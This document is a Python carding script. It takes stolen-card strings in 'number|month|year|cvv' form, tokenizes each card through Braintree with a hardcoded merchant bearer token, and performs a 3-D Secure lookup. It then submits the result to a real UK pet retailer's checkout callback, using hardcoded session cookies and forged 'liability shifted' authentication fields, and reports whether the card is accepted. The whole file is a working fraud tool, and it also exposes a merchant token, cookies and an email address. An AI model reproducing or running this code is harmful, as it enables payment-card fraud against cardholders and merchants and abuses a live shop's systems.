import requests
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	r = requests.session()
	headers = {
      'authority': 'payments.braintree-api.com',
      'accept': '*/*',
      'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
      'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2OTc3NTE5NDcsImp0aSI6ImQ4YmIyMjcxLTkwMTItNDU1ZS05NTc1LWRlODBkZDgzMGExNyIsInN1YiI6InlkOWtnZnhuamNqMnYyZDQiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InlkOWtnZnhuamNqMnYyZDQiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.mK4eiv0T16zX6vLXlOV2pWGx4_sCUPAP7mbpDbWJGYqxbkQfjhlXstoE8PUcyE1tuDd6mRH-zRzl3qSD8PCLIg',
      'braintree-version': '2018-05-10',
      'content-type': 'application/json',
      'origin': 'https://assets.braintreegateway.com',
      'referer': 'https://assets.braintreegateway.com/',
      'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'cross-site',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
  }

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'dropin2',
        'sessionId': '57fc774a-da39-4810-9522-a46c35dc05f9',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
                'cardholderName': 'ahmed mhmoud',
                'billingAddress': {
                    'postalCode': '10070',
                    'streetAddress': '137 vesey street', 
                },
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
        }

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

	aa = response.json()['data']['tokenizeCreditCard']['token']
    
	url = f'https://api.braintreegateway.com/merchants/yd9kgfxnjcj2v2d4/client_api/v1/payment_methods/{aa}/three_d_secure/lookup'
  
	head = {
    'authority': 'api.braintreegateway.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/json',
    'origin': 'https://www.thepetexpress.co.uk',
    'referer': 'https://www.thepetexpress.co.uk/',
    'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
}

	data = {
    'amount': '13.49',
    'additionalInfo': {
        'shippingGivenName': 'joker',
        'shippingSurname': 'mm',
        'acsWindowSize': '03',
        'billingLine1': '2 Good Shepherd Glen',
        'billingLine2': '',
        'billingCity': 'Londonderry',
        'billingState': '',
        'billingPostalCode': 'BT47 2AH',
        'billingCountryCode': 'GB',
        'billingGivenName': 'joker',
        'billingSurname': 'mm',
        'shippingLine1': '2 Good Shepherd Glen',
        'shippingLine2': '',
        'shippingCity': 'Londonderry',
        'shippingState': '',
        'shippingPostalCode': 'BT47 2AH',
        'shippingCountryCode': 'GB',
        'email': 'abdo1zamalek@gmail.com',
    },
    'bin': '440393',
    'dfReferenceId': '1_520d9a9a-348d-4808-b9ba-af08ec322b59',
    'clientMetadata': {
        'requestedThreeDSecureVersion': '2',
        'sdkVersion': 'web/3.85.2',
        'cardinalDeviceDataCollectionTimeElapsed': 864,
        'issuerDeviceDataCollectionTimeElapsed': 550,
        'issuerDeviceDataCollectionResult': True,
    },
    'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2OTc3NTE5NDcsImp0aSI6ImQ4YmIyMjcxLTkwMTItNDU1ZS05NTc1LWRlODBkZDgzMGExNyIsInN1YiI6InlkOWtnZnhuamNqMnYyZDQiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InlkOWtnZnhuamNqMnYyZDQiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.mK4eiv0T16zX6vLXlOV2pWGx4_sCUPAP7mbpDbWJGYqxbkQfjhlXstoE8PUcyE1tuDd6mRH-zRzl3qSD8PCLIg',
    'braintreeLibraryVersion': 'braintree/web/3.85.2',
    '_meta': {
        'merchantAppId': 'www.thepetexpress.co.uk',
        'platform': 'web',
        'sdkVersion': '3.85.2',
        'source': 'client',
        'integration': 'custom',
        'integrationType': 'custom',
        'sessionId': '57fc774a-da39-4810-9522-a46c35dc05f9',
    },
}

	req = requests.post(url, headers=head, json=data).json()

	y = req['paymentMethod']
	nonce = y['nonce']
	acsUrl = y['threeDSecureInfo']['acsUrl']
	cavv = y['threeDSecureInfo']['cavv']
	xid = y['threeDSecureInfo']['xid']
	acsTransactionId = y['threeDSecureInfo']['acsTransactionId']
	dsTransactionId = y['threeDSecureInfo']['dsTransactionId']
	threeDSecureAuthenticationId = y['threeDSecureInfo']['threeDSecureAuthenticationId']
	threeDSecureServerTransactionId = y['threeDSecureInfo']['threeDSecureServerTransactionId']
	issuingBank = y['binData']['issuingBank']
	countryOfIssuance = y['binData']['countryOfIssuance']
	productId = y['binData']['productId']
	cardType = y['details']['cardType']
	lastTwo = y['details']['lastTwo']
	lastFour = y['details']['lastFour']
	status = y['threeDSecureInfo']['status']


	cookies = {
    '_gcl_au': '1.1.1449257864.1696217999',
    '_fbp': 'fb.2.1696217999585.2071443368',
    'apay-session-set': 'fQz4P0Q87LwgiFIOqws6t4xUdNUtNFniQ2OqEeWHRovtfVaxnKAS%2F%2BpuuHXo1eU%3D',
    'cookie-preferences': '%7B%22analytics%22%3Atrue%2C%22marketing%22%3Atrue%2C%22social%22%3Atrue%7D',
    'shopping_cart': 'ed65f9bccac45fef194cbaf18386e21033929326',
    '_gid': 'GA1.3.447193584.1697580562',
    'PHPSESSID': 'dbrfrqfc3h8js9i7hr2rifdqqs',
    'VPKSignature': '65948e59cc4c2908c66c0eaeba7139f6cc6bf913bb13ef3af82db4e126c51ddb',
    '_uetsid': 'd30710e06d3911ee83d4cfe57f78ac61',
    '_uetvid': '5bb93e4060d511ee8004d17a1e63f983',
    '_ga': 'GA1.1.1732874871.1696217997',
    '_ga_KPSLCHTR7G': 'GS1.1.1697580561.4.1.1697581736.23.0.0',
}

	head = {
    'authority': 'www.thepetexpress.co.uk',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '_gcl_au=1.1.1449257864.1696217999; _fbp=fb.2.1696217999585.2071443368; apay-session-set=fQz4P0Q87LwgiFIOqws6t4xUdNUtNFniQ2OqEeWHRovtfVaxnKAS%2F%2BpuuHXo1eU%3D; cookie-preferences=%7B%22analytics%22%3Atrue%2C%22marketing%22%3Atrue%2C%22social%22%3Atrue%7D; shopping_cart=ed65f9bccac45fef194cbaf18386e21033929326; _gid=GA1.3.447193584.1697580562; PHPSESSID=dbrfrqfc3h8js9i7hr2rifdqqs; VPKSignature=65948e59cc4c2908c66c0eaeba7139f6cc6bf913bb13ef3af82db4e126c51ddb; _uetsid=d30710e06d3911ee83d4cfe57f78ac61; _uetvid=5bb93e4060d511ee8004d17a1e63f983; _ga=GA1.1.1732874871.1696217997; _ga_KPSLCHTR7G=GS1.1.1697580561.4.1.1697581736.23.0.0',
    'origin': 'https://www.thepetexpress.co.uk',
    'referer': 'https://www.thepetexpress.co.uk/checkout/pay/?error=Gateway+Rejected%3A+three_d_secure&method=braintree',
    'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

	data = {
    'nonce': nonce,
    'details[cardholderName]': 'ahmed mhmoud',
    'details[expirationMonth]': '04',
    'details[expirationYear]': '2025',
    'details[bin]': '',
    'details[cardType]': cardType,
    'details[lastFour]': lastFour,
    'details[lastTwo]': lastTwo,
    'type': 'CreditCard',
    'description': y['description'],
    'liabilityShifted': 'true',
    'liabilityShiftPossible': 'true',
    'threeDSecureInfo[liabilityShifted]': 'true',
    'threeDSecureInfo[liabilityShiftPossible]': 'true',
    'threeDSecureInfo[status]': status,
    'threeDSecureInfo[enrolled]': 'Y',
    'threeDSecureInfo[cavv]': cavv,
    'threeDSecureInfo[xid]': '',
    'threeDSecureInfo[acsTransactionId]': acsTransactionId,
    'threeDSecureInfo[dsTransactionId]': dsTransactionId,
    'threeDSecureInfo[eciFlag]': '05',
    'threeDSecureInfo[acsUrl]': acsUrl,
    'threeDSecureInfo[paresStatus]': 'Y',
    'threeDSecureInfo[threeDSecureAuthenticationId]': threeDSecureAuthenticationId,
    'threeDSecureInfo[threeDSecureServerTransactionId]': threeDSecureServerTransactionId,
    'threeDSecureInfo[threeDSecureVersion]': '2.2.0',
    'threeDSecureInfo[lookup][transStatus]': 'Y',
    'threeDSecureInfo[lookup][transStatusReason]': '',
    'threeDSecureInfo[authentication][transStatus]': '',
    'threeDSecureInfo[authentication][transStatusReason]': '',
    'binData[prepaid]': 'No',
    'binData[healthcare]': 'No',
    'binData[debit]': 'Yes',
    'binData[durbinRegulated]': 'Yes',
    'binData[commercial]': 'Unknown',
    'binData[payroll]': 'No',
    'binData[issuingBank]': issuingBank,
    'binData[countryOfIssuance]': countryOfIssuance,
    'binData[productId]': productId,
    }

	reqq = requests.post(
        'https://www.thepetexpress.co.uk/checkout/callback/?method=braintree&oid=374395',
        cookies=cookies,
        headers=head,
        data=data,
    ).json()
	try:
		match = reqq['url'].split('?error=')[1].split('&')[0].replace('+', ' ')
	except:
		return 'success'
	return match